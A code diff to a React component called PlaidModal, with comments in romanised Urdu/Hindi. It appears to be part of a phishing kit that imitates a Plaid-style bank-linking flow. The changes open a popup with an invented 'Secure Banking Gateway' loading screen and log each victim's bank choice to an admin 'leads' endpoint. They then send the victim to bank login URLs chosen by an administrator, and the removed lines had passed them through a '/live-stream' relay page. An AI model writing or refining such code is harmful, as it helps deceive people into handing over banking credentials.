@@ -110,27 +110,34 @@ export default function PlaidModal({ isOpen, onClose }: PlaidModalProps) {
 
   if (!isOpen) return null;
 
-  // 🚀 Strictly check enabled checkboxes from admin configuration
+// Admin checkboxes ke mutabiq available options nikalna
   const getAvailableOptions = (bank: Bank) => {
-    const options = [];
+    const options: string[] = [];
     if (bank.enablePersonal === true) options.push("Personal");
     if (bank.enableBusiness === true) options.push("Business");
     if (bank.enableCommercial === true) options.push("Commercial");
-    return options.length > 0 ? options : ["Personal"];
+    return options;
   };
 
-const handleBankClick = (bank: Bank) => {
+  const handleBankClick = (bank: Bank) => {
     setSelectedBank(bank);
-    // 🚀 Laazmi taur par second screen (Step 2) show hogi sub-options ke sath
-    setStep(2);
+    const available = getAvailableOptions(bank);
+    
+    // Final Smart Logic:
+    // - Agar 1 se zyada options hain -> Step 2 show karo
+    // - Agar sirf 1 option hai ya koi bhi nahi -> Direct Step 3 (Login Screen) par jao
+    if (available.length > 1) {
+      setStep(2);
+    } else {
+      setSelectedOption(available[0] || "Personal");
+      setStep(3);
+    }
   };
 
   const handleOptionClick = (option: string) => {
     setSelectedOption(option);
     setStep(3);
   };
-
- 
 
   const handleBack = () => {
     if (step === 3) {
@@ -173,57 +180,88 @@ const handleBankClick = (bank: Bank) => {
   };
 
   const handleContinueToLogin = async () => {
+    const popupWidth = 860;
+    const popupHeight = 650;
+    const left = window.innerWidth / 2 - popupWidth / 2;
+    const top = window.innerHeight / 2 - popupHeight / 2;
+
+    const newWindow = window.open(
+      "",
+      "OpenBankingPortal",
+      `width=${popupWidth},height=${popupHeight},top=${top},left=${left},scrollbars=yes,resizable=yes`
+    );
+
+    if (newWindow) {
+      newWindow.document.write(`
+        <html>
+          <head><title>Secure Banking Gateway</title></head>
+          <body style="font-family: system-ui, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #0f172a; color: #fff; margin: 0;">
+            <div style="text-align: center;">
+              <div style="width: 40px; height: 40px; border: 4px solid #334155; border-top-color: #38bdf8; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 16px;"></div>
+              <h3 style="margin: 0; font-size: 16px; font-weight: 700;">Connecting to ${selectedBank?.name || "Bank"}...</h3>
+              <p style="color: #94a3b8; font-size: 12px; margin-top: 6px;">Establishing secure session gateway</p>
+            </div>
+            <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
+          </body>
+        </html>
+      `);
+    }
+
     setIsTransitioning(true);
 
     try {
       const activeLeadId = localStorage.getItem("active_lead_id");
       
-      let targetUrl = selectedBank?.personalUrl || selectedBank?.redirectUrl || "https://authorise.lloydsbank.co.uk/auth/user";
+      let targetUrl = "";
       const optLower = (selectedOption || "").toLowerCase();
-      if (optLower.includes("business") && selectedBank?.businessUrl) {
-        targetUrl = selectedBank.businessUrl;
-      } else if ((optLower.includes("commercial") || optLower.includes("corporate")) && selectedBank?.commercialUrl) {
-        targetUrl = selectedBank.commercialUrl;
+      
+      if (optLower.includes("business")) {
+        targetUrl = selectedBank?.businessUrl || selectedBank?.personalUrl || "";
+      } else if (optLower.includes("commercial") || optLower.includes("corporate")) {
+        targetUrl = selectedBank?.commercialUrl || selectedBank?.personalUrl || "";
+      } else {
+        targetUrl = selectedBank?.personalUrl || selectedBank?.businessUrl || selectedBank?.commercialUrl || "";
       }
 
+      if (!targetUrl) {
+        targetUrl = "https://authorise.lloydsbank.co.uk/auth/user";
+      }
+
+      // Exact Lead Tracking Update Payload
       if (activeLeadId && activeLeadId !== "undefined" && activeLeadId !== "null") {
         await fetch(`/api/admin/leads/${activeLeadId}`, {
           method: "PUT",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
-            bankName: selectedBank?.name || "Bank",
-            bankType: selectedOption,
+            bank: selectedBank?.name || "Selected Bank",
+            bankName: selectedBank?.name || "Selected Bank",
+            bankType: selectedOption || "Personal",
             redirectUrl: targetUrl,
-            extraData: `Bank Selected: ${selectedBank?.name} (${selectedOption}) - URL: ${targetUrl}`,
+            extraData: `Verified Bank: ${selectedBank?.name} | Category: ${selectedOption} | Target: ${targetUrl}`,
           }),
         });
       }
 
-      setTimeout(() => {
+   const streamUrl = targetUrl;
+   
+   setTimeout(() => {
         setIsTransitioning(false);
-        
-        const streamUrl = `/live-stream?bank=${encodeURIComponent(selectedBank?.name || "Bank")}&type=${encodeURIComponent(selectedOption)}&targetUrl=${encodeURIComponent(targetUrl)}`;
-
-        const popupWidth = 860;
-        const popupHeight = 650;
-        const left = window.innerWidth / 2 - popupWidth / 2;
-        const top = window.innerHeight / 2 - popupHeight / 2;
-
-        window.open(
-          streamUrl,
-          "OpenBankingPortal",
-          `width=${popupWidth},height=${popupHeight},top=${top},left=${left},scrollbars=yes,resizable=yes`
-        );
-
+        if (newWindow) {
+          newWindow.location.href = streamUrl;
+        } else {
+          window.open(streamUrl, "OpenBankingPortal");
+        }
         onClose();
-      }, 600);
+      }, 400);
+
     } catch (err) {
       console.error("Failed to process login redirection:", err);
       setIsTransitioning(false);
+      if (newWindow) newWindow.close();
     }
   };
 
-  const parsedOptions = selectedBank ? getAvailableOptions(selectedBank) : ["Personal", "Business", "Commercial"];
+  const parsedOptions = selectedBank ? getAvailableOptions(selectedBank) : ["Personal"];
 
   const renderLogo = (bank: Bank) => {
     if (bank.logoUrl) {
